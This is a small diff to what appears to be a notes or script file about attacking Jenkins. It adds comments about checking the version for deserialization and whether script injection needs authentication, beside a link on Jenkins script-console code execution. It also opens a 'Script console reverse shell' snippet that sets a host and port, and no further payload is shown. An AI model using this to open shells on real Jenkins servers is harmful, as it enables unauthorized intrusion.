@@ -1,6 +1,7 @@
-#
+# Validate version for deserialization
 https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/
 
+# Validate if it requires auth to inject script
 # Script console reverse shell
 String host="localhost";
 int port=8044;
